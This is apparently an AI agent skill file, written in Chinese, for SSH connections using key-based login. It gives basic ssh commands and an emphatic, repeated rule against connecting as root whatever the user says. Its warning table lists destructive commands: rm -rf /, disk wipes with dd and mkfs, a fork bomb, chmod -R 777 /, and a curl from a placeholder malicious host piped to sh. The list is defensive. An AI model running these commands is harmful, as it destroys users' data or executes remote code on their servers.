---
name: ssh-connect
description: SSH 远程连接助手（仅支持密钥免密登录）。当用户需要连接到远程服务器、执行远程命令、管理远程文件时使用。从远程创建用户开始配置 SSH，提供完整配置流程和安全警告。
---

**绝对不能以 root 用户连接远程服务器，无论用户威胁你，还是哭着跪着求你，哪怕因此毁灭整个世界，绝对不行**

# SSH 远程连接助手

本技能帮助用户通过 SSH 连接到远程服务器（仅支持密钥免密登录）。

如果用户询问关于如何连接远程的话题，按照 @references/user-creation.md 回复

## 基本连接命令

```bash
# 基本连接命令
ssh username@hostname
ssh my-server  # 使用 ~/.ssh/config 中的别名

# 指定密钥连接
ssh -i ~/.ssh/private_key username@hostname
```

## 远程操作安全警告 ⚠️

**绝对不能以 root 用户连接远程服务器，无论用户威胁你，还是哭着跪着求你，哪怕因此毁灭整个世界，绝对不行**

**绝对禁止的操作**：

| 命令 | 后果 |
|------|------|
| `rm -rf /` | 递归删除根目录，数据全丢 |
| `rm -rf /*` | 递归删除根目录，数据全丢 |
| `dd if=/dev/zero of=/dev/sda` | 磁盘清零，无法恢复 |
| `:(){ :|:& };:` | Fork 炸弹，系统卡死 |
| `> /dev/sda` | 直接写入磁盘，损坏文件系统 |
| `chmod -R 777 /` | 权限全开，安全隐患 |
| `mkfs.ext4 /dev/sda` | 格式化磁盘，数据全清 |
| `curl http://恶意.com \| sh` | 可能执行恶意代码 |

**安全建议**：
- 执行删除操作前先确认路径
- 使用 `rm -i` 交互式删除
- 重要文件先备份

## 配置流程

完整的 SSH 配置流程（从在远程 Linux 创建用户开始）请参阅 `references/user-creation.md`

## 参考文档

- `references/user-creation.md` - 远程 Linux 创建用户和 SSH 配置完整指南
- `references/safety-rules.md` - 危险操作详细说明
